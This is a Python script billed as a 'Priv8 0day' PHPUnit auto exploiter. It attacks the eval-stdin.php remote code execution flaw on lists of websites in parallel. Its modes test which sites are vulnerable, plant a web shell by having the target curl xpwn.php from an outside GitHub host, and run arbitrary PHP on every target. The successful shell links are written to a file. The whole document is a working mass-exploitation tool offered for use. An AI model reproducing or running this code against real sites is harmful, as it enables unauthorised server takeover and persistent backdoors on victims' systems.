##  PHPUnit Auto Exploiter
##  Priv8 0day
##  Coded by NinjaCR3
##  Twitter : @Ninja3Sec
##  Working with multiprocessing :)

# <?php $shell = file_get_contents("https://raw.githubusercontent.com/NinjaCR3/tools/master/xpwn.php"); touch(getcwd()."/xpwn.php"); $dosya = fopen(getcwd()."/xpwn.php","w"); fwrite($dosya,$shell); ?>

import os
import sys
from multiprocessing.dummy import Pool

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

print("""
  ██████╗ ██╗  ██╗██████╗ ██╗   ██╗███╗   ██╗██╗████████╗
  ██╔══██╗██║  ██║██╔══██╗██║   ██║████╗  ██║██║╚══██╔══╝
  ██████╔╝███████║██████╔╝██║   ██║██╔██╗ ██║██║   ██║   
  ██╔═══╝ ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║   ██║   
  ██║     ██║  ██║██║     ╚██████╔╝██║ ╚████║██║   ██║   
  ╚═╝     ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝   
                                                                                        
  [#] PHPUnit Auto Exploiter
  [#] Priv8 0day
  [#] Coded by NinjaCR3
  [#] Twitter : @Ninja3Sec
  [#] Working with multiprocessing :)
""")


try:
	import requests
except:
	print("[-] Requests module not found! Please install requests module and run script again!")
	sys.exit()



def control1(site):
	if "http" in site:
		explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		newsite = site
	else:
		explink = "http://" + site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		newsite = "http://" + site
	try:
		data = "<?php echo 'NinjaCR3';?>"
		r = requests.get(explink, data=data)
		if "NinjaCR3" in r.text:
			print("[+] Vulnerable  ==>  " + newsite)
			with open("vulns.txt","a") as f:
				f.write(newsite + "\n")
		else:
			print("[-] Not Vulnerable  ==>  " + newsite)
	except:
		print("[-] Not Vulnerable  ==>  " + newsite)
			
			
			
def control2(site):
	explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
	try:
		data = "<?php echo 'Vulnerable';?>"
		r = requests.get(explink, data=data)
		if "Vulnerable" in r.text:
			print("[+] Vulnerable  ==>  " + site)
		else:
			print("[-] Not Vulnerable  ==>  " + site)
	except:
		print("[-] Not Vulnerable  ==>  " + site)



def exploit1(site):
	if "http" in site:
		explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		newsite = site
	else:
		explink = "http://" + site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
		newsite = "http://" + site
	try:
		data = "<?php system('curl https://raw.githubusercontent.com/NinjaCR3/tools/master/xpwn.php >> xpwn.php');?>"
		r = requests.get(explink, data=data)
		kontrol = requests.get(newsite + "/vendor/phpunit/phpunit/src/Util/PHP/xpwn.php")
		if "NinjaCR3" in kontrol.text:
			print("\n[+] Successfully Exploited  ==>  " + newsite)
			print("    Shell Link  ==>  " + newsite + "/vendor/phpunit/phpunit/src/Util/PHP/xpwn.php\n")
			with open("shells.txt","a") as f:
				f.write(newsite + "/vendor/phpunit/phpunit/src/Util/PHP/xpwn.php\n")
		else:
			print("[-] Failed  ==>  " + newsite)
	except:
		print("[-] Failed  ==>  " + newsite)
		

		
			
def exploit2(site):
	explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
	try:
		data = "<?php system('curl https://raw.githubusercontent.com/NinjaCR3/tools/master/xpwn.php >> xpwn.php');?>"
		r = requests.get(explink, data=data)
		kontrol = requests.get(site + "/vendor/phpunit/phpunit/src/Util/PHP/xpwn.php")
		if "NinjaCR3" in kontrol.text:
			print("\n[+] Successfully Exploited  ==>  " + site)
			print("    Shell Link  ==>  " + site + "/vendor/phpunit/phpunit/src/Util/PHP/xpwn.php\n")
		else:
			print("[-] Failed  ==>  " + site)
	except:
		print("[-] Failed  ==>  " + site)
		
		
		
def run1(sitelist,command):
	for site in sitelist:
		if "http" in site:
			explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
			newsite = site
		else:
			explink = "http://" + site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
			newsite = "http://" + site
		try:
			r = requests.get(explink, data=command)
			print("[+] Website  ==>  " + newsite + "\n    Result:")
			print(r.text + "\n")
		except:
			print("[-] Failed  ==>  " + newsite + "\n")
		
		
		
def run2(site,command):
	explink = site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
	try:
		r = requests.get(explink, data=command)
		print("\n[+] Website  ==>  " + site + "\n    Result:")
		print(r.text + "\n")
	except:
		print("\n[-] Failed  ==>  " + site + "\n")




tool = input("[1] Control\n[2] Auto Shell Upload\n[3] Run command\n\n[*] Tool : ")




if tool == "1":
	site = input("[*] Enter website or sitelist location : ")
	print("")
	if site == "":
		sys.exit()
	else:
		if ".txt" in site:
			try:
				sitelist = open(site,"r").read().splitlines()
				pp = Pool(100)
				pr = pp.map(control1,sitelist)
			except:
				print("[-] Error! Sitelist not found or you enter wrong format!")
				sys.exit()
		else:
			if "http" in site:
				control2(site)
			else:
				site = "http://" + site
				control2(site)
				
				
				
elif tool == "2":
	site = input("[*] Enter website or sitelist location : ")
	print("")
	if site == "":
		sys.exit()
	else:
		if ".txt" in site:
			try:
				sitelist = open(site,"r").read().splitlines()
				pp = Pool(100)
				pr = pp.map(exploit1,sitelist)
			except:
				print("[-] Error! Sitelist not found or you enter wrong format!")
				sys.exit()
		else:
			if "http" in site:
				exploit2(site)
			else:
				site = "http://" + site
				exploit2(site)
				
				
				
elif tool == "3":
	site = input("[*] Enter website or sitelist location : ")
	command = input("[*] Enter PHP codes  ==>  ")
	print("")
	if site == "":
		sys.exit()
	else:
		if ".txt" in site:
			try:
				sitelist = open(site,"r").read().splitlines()
				run1(sitelist,command)
			except:
				print("[-] Error! Sitelist not found or you enter wrong format!")
				sys.exit()
		else:
			if "http" in site:
				run2(site,command)
			else:
				site = "http://" + site
				run2(site,command)
				
				
				
else:
	sys.exit()